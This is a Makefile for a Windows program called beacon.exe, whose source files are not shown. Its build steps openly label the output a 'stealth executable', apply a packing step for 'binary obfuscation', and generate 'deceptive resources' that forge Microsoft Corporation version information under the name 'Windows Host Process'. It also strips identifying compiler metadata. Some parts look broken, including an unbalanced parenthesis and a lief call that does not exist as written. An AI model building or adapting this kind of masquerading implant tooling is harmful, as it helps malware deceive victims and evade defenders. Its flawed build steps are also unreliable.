TARGET      := beacon.exe
BUILD_DIR   := .build
OBJ_DIR     := $(BUILD_DIR)/obj
RES_DIR     := $(BUILD_DIR)/res

ifeq ($(OS),Windows_NT)
    CC      := clang-cl
    LD      := lld-link
    RM      := del /q /f
    MKDIR   := mkdir
else
    CC      := x86_64-w64-mingw32-clang
    LD      := x86_64-w64-mingw32-lld
    RM      := rm -f
    MKDIR   := mkdir -p
endif

CFLAGS_BASE := \
    -target x86_64-pc-windows-msvc \
    -fuse-ld=lld \
    -D_WIN32_WINNT=0xA00 \
    -mno-stack-arg-probe \
    -fno-asynchronous-unwind-tables \
    -fno-ident \
    -fno-stack-protector \
    -fno-builtin \
    -Qn

ifeq ($(DEBUG),1)
    CFLAGS  := $(CFLAGS_BASE) -O0 -g -DDEBUG
    LDFLAGS := -debug
else
    CFLAGS  := $(CFLAGS_BASE) -Os -flto -s -DNDEBUG
    LDFLAGS := -subsystem:windows -entry:main
endif

SRCS := main.c timer_sleep.c
OBJS := $(addprefix $(OBJ_DIR)/,$(notdir $(SRCS:.c=.o))

VERSION_RES := $(RES_DIR)/version.res
EMBED_OBJ   := $(OBJ_DIR)/embedded.o

all: $(BUILD_DIR)/$(TARGET)

$(BUILD_DIR)/$(TARGET): $(OBJS) $(EMBED_OBJ)
	@echo "[*] Linking stealth executable"
	@$(LD) $(LDFLAGS) $^ advapi32.lib kernel32.lib -out:$@
ifeq ($(DEBUG),)
	@echo "[+] Applying binary obfuscation"
	@python3 -c "import lief; b=lief.parse('$@'); b.pack(); b.write('$@')"
endif

$(OBJ_DIR)/%.o: %.c | $(OBJ_DIR)
	@echo "[*] Compiling $<"
	@$(CC) $(CFLAGS) -c $< -o $@

$(VERSION_RES): | $(RES_DIR)
	@echo "[*] Generating deceptive resources"
	@echo "1 VERSIONINFO FILEVERSION 10,0,19041,1 PRODUCTVERSION 10,0,19041,1" > $(RES_DIR)/version.rc
	@echo 'FILEFLAGSMASK 0x3fL' >> $(RES_DIR)/version.rc
	@echo 'FILEFLAGS 0x0L' >> $(RES_DIR)/version.rc
	@echo 'FILEOS 0x40004L' >> $(RES_DIR)/version.rc
	@echo 'FILETYPE 0x1L' >> $(RES_DIR)/version.rc
	@echo 'FILESUBTYPE 0x0L' >> $(RES_DIR)/version.rc
	@echo 'BEGIN BLOCK "StringFileInfo"' >> $(RES_DIR)/version.rc
	@echo 'BEGIN BLOCK "040904b0"' >> $(RES_DIR)/version.rc
	@echo 'VALUE "CompanyName", "Microsoft Corporation"' >> $(RES_DIR)/version.rc
	@echo 'VALUE "FileDescription", "Windows Host Process"' >> $(RES_DIR)/version.rc
	@echo 'VALUE "FileVersion", "10.0.19041.1"' >> $(RES_DIR)/version.rc
	@echo 'VALUE "ProductName", "Microsoft Windows Operating System"' >> $(RES_DIR)/version.rc
	@echo 'END BLOCK' >> $(RES_DIR)/version.rc
	@echo 'END BLOCK' >> $(RES_DIR)/version.rc
	@llvm-rc /fo $@ $(RES_DIR)/version.rc

$(EMBED_OBJ): $(VERSION_RES)
	@echo "[*] Embedding resources"
	@ld.lld -r -b binary -o $@ $^

$(OBJ_DIR) $(RES_DIR):
	@$(MKDIR) $@

clean:
	@echo "[!] Purging build artifacts"
	@$(RM) $(BUILD_DIR)/$(TARGET)
	@$(RM) $(OBJS)
	@$(RM) $(EMBED_OBJ)
	@$(RM) $(VERSION_RES)
	@$(RM) $(RES_DIR)/version.rc

.PHONY: all clean
.NOTPARALLEL:
.SILENT:

ifeq ($(shell which $(CC)),)
$(error Compiler $(CC) not found. Install LLVM toolchain)
endif